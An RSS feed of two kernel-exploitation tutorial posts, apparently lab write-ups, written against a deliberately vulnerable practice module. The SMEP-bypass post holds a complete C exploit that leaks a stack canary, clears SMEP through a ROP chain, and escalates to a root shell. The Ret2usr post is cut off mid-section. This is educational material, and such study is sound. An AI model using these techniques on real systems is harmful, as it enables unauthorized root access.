<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Kernel on Anvbis</title><link>https://www.anvbis.net/categories/kernel/</link><description>Recent content in Kernel on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Copyright 2020 Anvbis</copyright><lastBuildDate>Fri, 10 Dec 2021 00:00:00 +0000</lastBuildDate><atom:link href="https://www.anvbis.net/categories/kernel/index.xml" rel="self" type="application/rss+xml"/><item><title>Linux Kernel :: SMEP Bypass</title><link>https://www.anvbis.net/posts/linux-kernel-smep-bypass/</link><pubDate>Fri, 10 Dec 2021 00:00:00 +0000</pubDate><guid>https://www.anvbis.net/posts/linux-kernel-smep-bypass/</guid><description>Environment Setup #!/bin/bash # build root fs pushd fs find . -print0 | cpio --null -ov --format=newc | gzip -9 &amp;gt; ../initramfs.cpio.gz popd # launch /usr/bin/qemu-system-x86_64 \ -kernel linux-5.4/arch/x86/boot/bzImage \ -initrd $PWD/initramfs.cpio.gz \ -fsdev local,security_model=passthrough,id=fsdev0,path=$HOME \ -device virtio-9p-pci,id=fs0,fsdev=fsdev0,mount_tag=hostshare \ -nographic \ -monitor none \ -s \ -cpu kvm64,+smep \ -append &amp;#34;console=ttyS0 nokaslr quiet&amp;#34; ~/pwnkernel $ ./launch.sh Practice Kernel Module #include &amp;lt;linux/kernel.</description><content>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># build root fs&lt;/span>
pushd fs
find . -print0 | cpio --null -ov --format&lt;span style="color:#f92672">=&lt;/span>newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
&lt;span style="color:#75715e"># launch&lt;/span>
/usr/bin/qemu-system-x86_64 &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -kernel linux-5.4/arch/x86/boot/bzImage &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -initrd $PWD/initramfs.cpio.gz &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -fsdev local,security_model&lt;span style="color:#f92672">=&lt;/span>passthrough,id&lt;span style="color:#f92672">=&lt;/span>fsdev0,path&lt;span style="color:#f92672">=&lt;/span>$HOME &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -device virtio-9p-pci,id&lt;span style="color:#f92672">=&lt;/span>fs0,fsdev&lt;span style="color:#f92672">=&lt;/span>fsdev0,mount_tag&lt;span style="color:#f92672">=&lt;/span>hostshare &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -nographic &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -monitor none &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -s &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -cpu kvm64,+smep &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -append &lt;span style="color:#e6db74">&amp;#34;console=ttyS0 nokaslr quiet&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;h2 id="practice-kernel-module">Practice Kernel Module&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/kernel.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/module.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/fs.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/proc_fs.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/uaccess.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
MODULE_LICENSE(&lt;span style="color:#e6db74">&amp;#34;GPL&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> data[&lt;span style="color:#ae81ff">32&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_to_user(buf, data, len);
}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> data[&lt;span style="color:#ae81ff">32&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_from_user(data, buf, len);
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/ $ cp challenge.c ~/pwnkernel/src/challenge.c
&lt;/code>&lt;/pre>&lt;pre>&lt;code># add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
...
/ # id
uid=0(root) gid=0
/ # insmod ./challenge.ko
&lt;/code>&lt;/pre>&lt;h2 id="bypassing-smep-protection">Bypassing SMEP Protection&lt;/h2>
&lt;pre>&lt;code>/ # cat /proc/kallsyms | grep native_write_cr4
ffffffff8102dab0 T native_write_cr4
&lt;/code>&lt;/pre>&lt;pre>&lt;code>pwndbg&amp;gt; p $cr4
$1 = [ SMEP OSXMMEXCPT OSFXSR PGE MCE PAE PSE ]
pwndbg&amp;gt; p/x $cr4
$2 = 0x1006f0
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">rop_chain[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff81001518&lt;/span>; &lt;span style="color:#75715e">// pop rdi; ret
&lt;/span>&lt;span style="color:#75715e">&lt;/span>rop_chain[&lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rdi = 0x6f0
&lt;/span>&lt;span style="color:#75715e">&lt;/span>rop_chain[&lt;span style="color:#ae81ff">2&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8102dab0&lt;/span>; &lt;span style="color:#75715e">// native_write_cr4
&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="exploit-development">Exploit Development&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">nclude &lt;span style="color:#f92672">&amp;lt;&lt;/span>stdio.h&lt;span style="color:#f92672">&amp;gt;&lt;/span>
&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;stdlib.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;assert.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;unistd.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;fcntl.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> save_ss, save_sp, save_rf, save_cs;
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">shell&lt;/span>()
{
system(&lt;span style="color:#e6db74">&amp;#34;/bin/sh&amp;#34;&lt;/span>);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">save_user_space&lt;/span>()
{
&lt;span style="color:#75715e">/* save user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_ss, ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_sp, rsp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pushf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;pop save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov save_cs, cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">load_user_space&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> target)
{
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;swapgs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_ss;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_sp;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_rf;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, save_cs;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;mov r15, %[rip];&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;push r15;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;iretq;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
&lt;span style="color:#f92672">:&lt;/span> [rip] &lt;span style="color:#e6db74">&amp;#34;=&amp;amp;r&amp;#34;&lt;/span> (target)
);
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">escalate_privileges&lt;/span>()
{
&lt;span style="color:#75715e">/* escalate privileges */&lt;/span>
__asm__(
&lt;span style="color:#e6db74">&amp;#34;.intel_syntax noprefix;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;xor rdi, rdi;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff810881c0;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// prepare_kernel_cred
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;movabs rbx, 0xffffffff81087e80;&amp;#34;&lt;/span> &lt;span style="color:#75715e">// commit_creds
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#e6db74">&amp;#34;mov rdi, rax;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;call rbx;&amp;#34;&lt;/span>
&lt;span style="color:#e6db74">&amp;#34;.att_syntax;&amp;#34;&lt;/span>
);
&lt;span style="color:#75715e">/* return to user-space */&lt;/span>
load_user_space((&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)shell);
}
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> &lt;span style="color:#a6e22e">leak_canary&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> leak[&lt;span style="color:#ae81ff">5&lt;/span>];
read(fd, leak, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">5&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> leak[&lt;span style="color:#ae81ff">4&lt;/span>];
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">overflow_buffer&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> fd, &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary)
{
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> payload[&lt;span style="color:#ae81ff">6&lt;/span>];
payload[&lt;span style="color:#ae81ff">4&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> canary;
payload[&lt;span style="color:#ae81ff">5&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff81001518&lt;/span>; &lt;span style="color:#75715e">// pop rdi; ret
&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0x6f0&lt;/span>; &lt;span style="color:#75715e">// rdi = 0x6f0
&lt;/span>&lt;span style="color:#75715e">&lt;/span> payload[&lt;span style="color:#ae81ff">7&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff8102dab0&lt;/span>; &lt;span style="color:#75715e">// native_write_cr4
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
payload[&lt;span style="color:#ae81ff">8&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>)escalate_privileges;
write(fd, payload, &lt;span style="color:#66d9ef">sizeof&lt;/span>(&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> &lt;span style="color:#ae81ff">6&lt;/span>);
}
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv)
{
save_user_space();
&lt;span style="color:#66d9ef">int&lt;/span> fd &lt;span style="color:#f92672">=&lt;/span> open(&lt;span style="color:#e6db74">&amp;#34;/proc/challenge&amp;#34;&lt;/span>, O_RDWR);
assert(fd &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>);
&lt;span style="color:#75715e">/* leak stack canary */&lt;/span>
&lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">long&lt;/span> canary &lt;span style="color:#f92672">=&lt;/span> leak_canary(fd);
printf(&lt;span style="color:#e6db74">&amp;#34;[*] canary @ 0x%lx&lt;/span>&lt;span style="color:#ae81ff">\n&lt;/span>&lt;span style="color:#e6db74">&amp;#34;&lt;/span>, canary);
overflow_buffer(fd, canary);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/linux-kernel-exp/smep-bypass $ id
uid=1000(ctf) gid=1000 groups=1000
~/linux-kernel-exp/smep-bypass $ ./exploit
[*] canary @ 0xb30ee19bbcd24b00
/home/ctf/linux-kernel-exp/smep-bypass # id
uid=0(root) gid=0
&lt;/code>&lt;/pre></content></item><item><title>Linux Kernel :: Ret2usr</title><link>https://www.anvbis.net/posts/linux-kernel-ret2usr/</link><pubDate>Thu, 09 Dec 2021 00:00:00 +0000</pubDate><guid>https://www.anvbis.net/posts/linux-kernel-ret2usr/</guid><description>Environment Setup ~/ $ git clone https://github.com/pwncollege/pwnkernel.git Cloning into 'pwnkernel'... remote: Enumerating objects: 115, done. remote: Counting objects: 100% (115/115), done. remote: Compressing objects: 100% (73/73), done. remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0 Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done. Resolving deltas: 100% (59/59), done. ~/ $ cd pwnkernel/ ~/pwnkernel $ ./build.sh ... #!/bin/bash # build root fs pushd fs find .</description><content>&lt;h2 id="environment-setup">Environment Setup&lt;/h2>
&lt;pre>&lt;code>~/ $ git clone https://github.com/pwncollege/pwnkernel.git
Cloning into 'pwnkernel'...
remote: Enumerating objects: 115, done.
remote: Counting objects: 100% (115/115), done.
remote: Compressing objects: 100% (73/73), done.
remote: Total 115 (delta 59), reused 92 (delta 37), pack-reused 0
Receiving objects: 100% (115/115), 18.84 KiB | 9.42 MiB/s, done.
Resolving deltas: 100% (59/59), done.
~/ $ cd pwnkernel/
~/pwnkernel $ ./build.sh
...
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-sh" data-lang="sh">&lt;span style="color:#75715e">#!/bin/bash
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
&lt;span style="color:#75715e"># build root fs&lt;/span>
pushd fs
find . -print0 | cpio --null -ov --format&lt;span style="color:#f92672">=&lt;/span>newc | gzip -9 &amp;gt; ../initramfs.cpio.gz
popd
&lt;span style="color:#75715e"># launch&lt;/span>
/usr/bin/qemu-system-x86_64 &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -kernel linux-5.4/arch/x86/boot/bzImage &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -initrd $PWD/initramfs.cpio.gz &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -fsdev local,security_model&lt;span style="color:#f92672">=&lt;/span>passthrough,id&lt;span style="color:#f92672">=&lt;/span>fsdev0,path&lt;span style="color:#f92672">=&lt;/span>$HOME &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -device virtio-9p-pci,id&lt;span style="color:#f92672">=&lt;/span>fs0,fsdev&lt;span style="color:#f92672">=&lt;/span>fsdev0,mount_tag&lt;span style="color:#f92672">=&lt;/span>hostshare &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -nographic &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -monitor none &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -s &lt;span style="color:#ae81ff">\
&lt;/span>&lt;span style="color:#ae81ff">&lt;/span> -append &lt;span style="color:#e6db74">&amp;#34;console=ttyS0 nokaslr quiet&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/pwnkernel $ ./launch.sh
&lt;/code>&lt;/pre>&lt;h2 id="debugging-the-kernel">Debugging the Kernel&lt;/h2>
&lt;pre>&lt;code>~/pwnkernel $ gdb ./linux-5.4/vmlinux
GNU gdb (Ubuntu 9.2-0ubuntu1~20.04) 9.2
...
pwndbg&amp;gt; target remote :1234
Remote debugging using :1234
default_idle () at arch/x86/kernel/process.c:581
...
&lt;/code>&lt;/pre>&lt;h2 id="practice-kernel-module">Practice Kernel Module&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-c" data-lang="c">&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/kernel.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/module.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/fs.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/proc_fs.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">#include&lt;/span> &lt;span style="color:#75715e">&amp;lt;linux/uaccess.h&amp;gt;&lt;/span>&lt;span style="color:#75715e">
&lt;/span>&lt;span style="color:#75715e">&lt;/span>
MODULE_LICENSE(&lt;span style="color:#e6db74">&amp;#34;GPL&amp;#34;&lt;/span>);
&lt;span style="color:#66d9ef">struct&lt;/span> proc_dir_entry &lt;span style="color:#f92672">*&lt;/span>proc_entry;
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_read&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> data[&lt;span style="color:#ae81ff">32&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_to_user(buf, data, len);
}
&lt;span style="color:#66d9ef">static&lt;/span> ssize_t &lt;span style="color:#a6e22e">challenge_write&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">*&lt;/span>buf, size_t len, loff_t &lt;span style="color:#f92672">*&lt;/span>off)
{
&lt;span style="color:#66d9ef">char&lt;/span> data[&lt;span style="color:#ae81ff">32&lt;/span>];
&lt;span style="color:#66d9ef">return&lt;/span> raw_copy_from_user(data, buf, len);
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_open&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">challenge_release&lt;/span>(&lt;span style="color:#66d9ef">struct&lt;/span> inode &lt;span style="color:#f92672">*&lt;/span>inode, &lt;span style="color:#66d9ef">struct&lt;/span> file &lt;span style="color:#f92672">*&lt;/span>fp)
{
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">static&lt;/span> &lt;span style="color:#66d9ef">struct&lt;/span> file_operations fops &lt;span style="color:#f92672">=&lt;/span> {
.read &lt;span style="color:#f92672">=&lt;/span> challenge_read,
.write &lt;span style="color:#f92672">=&lt;/span> challenge_write,
.open &lt;span style="color:#f92672">=&lt;/span> challenge_open,
.release &lt;span style="color:#f92672">=&lt;/span> challenge_release
};
&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#a6e22e">init_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
proc_entry &lt;span style="color:#f92672">=&lt;/span> proc_create(&lt;span style="color:#e6db74">&amp;#34;challenge&amp;#34;&lt;/span>, &lt;span style="color:#ae81ff">0666&lt;/span>, NULL, &lt;span style="color:#f92672">&amp;amp;&lt;/span>fops);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
}
&lt;span style="color:#66d9ef">void&lt;/span> &lt;span style="color:#a6e22e">cleanup_module&lt;/span>(&lt;span style="color:#66d9ef">void&lt;/span>)
{
&lt;span style="color:#66d9ef">if&lt;/span> (proc_entry) {
proc_remove(proc_entry);
}
}
&lt;/code>&lt;/pre>&lt;/div>&lt;pre>&lt;code>~/ $ cp challenge.c ~/pwnkernel/src/challenge.c
&lt;/code>&lt;/pre>&lt;pre>&lt;code># add more modules here!
obj-m = challenge.o
KERNEL_VERSION=5.4
all:
echo $(OBJECTS)
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) modules
clean:
make -C ../linux-$(KERNEL_VERSION) M=$(PWD) clean
&lt;/code>&lt;/pre>&lt;pre>&lt;code>~/pwnkernel $ ./build.sh
...
~/pwnkernel $ ./launch.sh
...
/ # id
uid=0(root) gid=0
/ # insmod ./challenge.ko
&lt;/code>&lt;/pre>&lt;h2 id="escalating-privileges">Escalating Privileges&lt;/h2>
&lt;pre>&lt;code>creds = prepare_kernel_cred(0);
commit_creds(creds);
&lt;/code>&lt;/pre>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-asm" data-lang="asm">&lt;span style="color:#a6e22e">xor&lt;/span> &lt;span style="color:#66d9ef">rdi&lt;/span>, &lt;span style="color:#66d9ef">rdi&lt;/span>
&lt;span style="color:#a6e22e">movabs&lt;/span> &lt;span style="color:#66d9ef">rbx&lt;/span>, &lt;span style="color:#66d9ef">prepare_kernel_cred&lt;/span>
